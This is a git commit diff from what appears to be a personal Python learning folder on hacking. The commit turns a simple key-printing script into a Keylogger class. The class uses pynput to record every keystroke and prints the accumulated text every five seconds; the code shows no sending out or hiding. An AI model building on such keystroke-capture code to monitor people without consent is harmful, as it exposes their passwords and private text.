feafe4395ab3f9dd43fb177d96738338b4827cae
marpehc <murciamarcos39@gmail.com>
2025-03-22 00:28:21 +0100

    Updated Hacking and created some files
    .

--- python/hacking-python/pynput.keyboard-APRENDER/keylogger.py
+++ python/hacking-python/pynput.keyboard-APRENDER/keylogger.py
@@ -1,11 +1,32 @@
 import pynput
+import threading
+
+log = ""
+
+class Keylogger:
+
+    def tecla_presionada(self,key):
+        global log
+        try:
+            log = log + str(key.char)
+        except:
+            if key == key.space:
+                log = log + " "
+            else:
+                log = log + " " + str(key) + " "
+              # Muestra el texto entero 
 
 
 
-def tecla_presionada(key):
-    print(key)
+    def reporte(self):
+        global log 
+        print(log)
+        log = ""
+        timer = threading.Timer(5, self.reporte) #Cada 10 segundos se ejecuta la función reporte. Con while loop daría problemas. 
+        timer.start()
 
-keyboard_listener = pynput.keyboard.Listener(on_press=tecla_presionada)
-
-with keyboard_listener:
-    keyboard_listener.join()
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.tecla_presionada)
+        with keyboard_listener:
+            self.reporte()
+            keyboard_listener.join()
